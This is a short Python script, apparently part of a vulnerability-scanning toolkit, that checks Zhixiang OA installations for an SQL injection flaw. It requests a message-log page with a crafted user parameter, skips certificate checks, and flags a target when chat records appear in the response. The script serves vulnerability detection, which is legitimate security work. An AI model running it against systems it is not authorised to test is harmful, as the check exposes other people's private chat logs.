#!/usr/bin/env python
# coding=utf-8
#存在致翔OASQL注入漏洞
import requests, threading
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''
def pscan_vuln(url):
    urls = url
    global results
    try:
        response = requests.get(url=url + '/mainpage/msglog.aspx?user=1', verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if '的聊天记录' in response.text:
            print(colored('[+]存在致翔OASQL注入漏洞', 'red'))
            results = f'{urls}-->存在致翔OASQL注入漏洞'
        else:
            print('[-]不存在致翔OASQL注入漏洞')
    except:
        print('[-]不存在致翔OASQL注入漏洞')


def zhixiangOA(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

